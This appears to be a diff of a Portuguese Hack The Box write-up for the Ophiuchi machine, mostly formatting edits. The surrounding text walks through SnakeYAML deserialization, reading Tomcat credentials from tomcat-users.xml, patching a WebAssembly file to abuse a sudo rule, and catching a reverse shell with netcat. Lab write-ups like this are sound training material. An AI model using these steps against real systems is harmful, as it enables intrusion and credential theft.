@@ -19,14 +19,15 @@ Olá pessoal!
 
 A máquina desta semana será **Ophiuchi**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [felamos](https://app.hackthebox.eu/users/27390).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
+</Alert>
 
 ![htb-ophiuchi](https://i.imgur.com/RgW95kn.png)
 
 Recentemente tenho iniciado os trabalhos nas máquinas do HTB por pesquisar sobre seu nome, pois ele ou a imagem podem "dar dicas" sobre como realizar a exploração.
 
-Ao buscar `define ophiuchi` no Google fui redirecionado para `define ophiucus`, que é uma constelação e seu nome em Português é *Serpentário*, o que faz algum sentido dado a imagem que temos um planeta e algumas estrelas, mas em breve veremos que não é apenas isso! \:smiley:
+Ao buscar `define ophiuchi` no Google fui redirecionado para `define ophiucus`, que é uma constelação e seu nome em Português é _Serpentário_, o que faz algum sentido dado a imagem que temos um planeta e algumas estrelas, mas em breve veremos que não é apenas isso! \:smiley:
 
 ## Enumeração
 
@@ -63,7 +64,7 @@ Ao enviar um valor YAML simples (`teste: true`), a seguinte mensagem é retornad
 
 > Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
 
-Já que o Tomcat é um webserver para aplicações java e, com base na mensagem retornada, busquei por `java yaml rce vulnerability` onde encontrei [um post no Medium](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) sobre uma vulnerabilidade chamada **SnakeYAML**, em que a prova de conceito nesta página se parecia bastante com a página a ser explorada. Adicionalmente, como *Snake* faz referência ao nome da constelação *ophiucus*, mostra que estamos no caminho certo \:smile:.
+Já que o Tomcat é um webserver para aplicações java e, com base na mensagem retornada, busquei por `java yaml rce vulnerability` onde encontrei [um post no Medium](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) sobre uma vulnerabilidade chamada **SnakeYAML**, em que a prova de conceito nesta página se parecia bastante com a página a ser explorada. Adicionalmente, como _Snake_ faz referência ao nome da constelação _ophiucus_, mostra que estamos no caminho certo \:smile:.
 
 Seguindo a sugestão, iniciado um servidor http via `sudo python3 -m http.server 80` e enviado o seguinte payload ao website:
 
@@ -138,8 +139,8 @@ bash-5.0$
 
 Iniciamos a enumeração como de costume executando o `linpeas.sh`, onde pudemos identificar os seguintes pontos:
 
-* Execução com a conta de serviço do Tomcat, com a qual temos privilégios de leitura dos arquivos relacionados à configuração do serviço e respectivas logs
-* O usuário a ser buscado é o **admin**, único com acesso console à máquina.
+- Execução com a conta de serviço do Tomcat, com a qual temos privilégios de leitura dos arquivos relacionados à configuração do serviço e respectivas logs
+- O usuário a ser buscado é o **admin**, único com acesso console à máquina.
 
 Com estas informações, realizado consulta do arquivo `/opt/tomcat/conf/tomcat-users.xml` que possui as credenciais dos usuários do tomcat, para que pudéssemos acessar a console
 
@@ -158,7 +159,7 @@ Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10
 -bash-5.0$ hostname && id
 ophiuchi
 uid=1000(admin) gid=1000(admin) groups=1000(admin)
--bash-5.0$ cat user.txt 
+-bash-5.0$ cat user.txt
 <redacted>
 -bash-5.0$
 ```
@@ -249,7 +250,7 @@ Pesquisando um pouco em como modificar um arquivo wasm, encontrei no site Mozill
 
 Os seguintes passos foram realizados para inspecionar e modificar o arquivo `main.wasm`:
 
-* Localizado o arquivo `main.wasm` na máquina e copiado o principal para a máquina atacante
+- Localizado o arquivo `main.wasm` na máquina e copiado o principal para a máquina atacante
 
 ```bash
 # Ophiuchi
@@ -264,18 +265,18 @@ $ cd ./loot
 $ scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
 ```
 
-* Baixado versão compilada do `wabt` para o diretório onde estávamos trabalhando
+- Baixado versão compilada do `wabt` para o diretório onde estávamos trabalhando
 
 ```bash
 wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
 tar -xzvf wabt-1.0.23-ubuntu.tar.gz
 ```
 
-* Convertido `main.wasm` para `main.wat`, retornando o seguinte conteúdo
+- Convertido `main.wasm` para `main.wat`, retornando o seguinte conteúdo
 
 ```bash
 $ wabt-1.0.23/bin/wasm2wat main.wasm -o main.wat
-$ cat main.wat                                                                                           
+$ cat main.wat
 (module
   (type (;0;) (func (result i32)))
   (func $info (type 0) (result i32)
@@ -291,15 +292,15 @@ $ cat main.wat
   (export "__heap_base" (global 2)))
 ```
 
-* Uma vez que precisamos retornar o valor `f == 1`, o valor vem da função `info`, onde faremos a alteração do valor `i32.const 0` para `i32.const 1`
-* Após alterá-lo, compilei novamente o arquivo para `main.wasm`, conforme comando abaixo e copiei para a máquina vítima no diretório que estamos trabalhando
+- Uma vez que precisamos retornar o valor `f == 1`, o valor vem da função `info`, onde faremos a alteração do valor `i32.const 0` para `i32.const 1`
+- Após alterá-lo, compilei novamente o arquivo para `main.wasm`, conforme comando abaixo e copiei para a máquina vítima no diretório que estamos trabalhando
 
 ```bash
 wabt-1.0.23/bin/wat2wasm main.wat -o main.wasm
 scp main.wasm admin@10.10.10.227:/dev/shm/zurc
 ```
 
-* Em uma segunda tentativa tive sucesso na execução do código \:smiley:
+- Em uma segunda tentativa tive sucesso na execução do código \:smiley:
 
 ```bash
 admin@ophiuchi:/dev/shm/zurc$ sudo /usr/bin/go run /opt/wasm-functions/index.go
@@ -307,7 +308,7 @@ Ready to deploy
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-* Uma vez confirmado o funcionamento, alterado o conteúdo do arquivo `deploy.sh` conforme previamente mencionado para obter o shell reverso, onde pude assim obter a flag de root.
+- Uma vez confirmado o funcionamento, alterado o conteúdo do arquivo `deploy.sh` conforme previamente mencionado para obter o shell reverso, onde pude assim obter a flag de root.
 
 ```bash
 $ nc -lnvp 4443
